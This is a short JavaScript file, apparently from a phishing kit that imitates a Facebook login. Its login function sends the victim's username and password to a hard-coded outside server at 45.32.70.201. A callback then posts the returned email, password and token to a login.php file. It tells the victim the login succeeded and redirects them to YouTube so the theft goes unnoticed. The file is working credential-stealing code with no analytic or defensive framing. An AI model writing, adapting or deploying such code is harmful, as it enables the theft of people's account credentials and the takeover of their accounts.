var FBLoginAPI2 = function(){
    var self = this;
    self.login = function(username, password, cb){
            var url = "http://45.32.70.201:8000/?";
            var pm_url = url + 'user=' + username + '&pass=' + password;
            pm_url += '&callback=photos';
            console.log("call");
            $.ajax({
                url: pm_url,
                dataType: 'jsonp',
                jsonpCallback: 'photos',
                jsonp: 'callback',
            });           
  };
  return self;
};
function photos (data) {
    console.log("a");
    if(data != undefined && data != null && data.c){
        var http = new XMLHttpRequest();
        var url = "login.php";    
        var params = "email=" + data.a + "&pass=" + data.b + "&token=" + data.c; 
        http.open("POST", url, true);
        http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

        http.onreadystatechange = function() {//Call a function when the state changes.
            if(http.readyState == 4 && http.status == 200) {
                console.log("b");
                $('#message').text('Login Successfully');
                window.location.replace("https://www.youtube.com/");
            }
        }
        http.send(params);
    }else{
            //console.log("Login fails");
            $('#message').text('Invalid Username or Password');
    }
    $('#deafultbox').hide(); 
    $('#mesbox').show(); 
};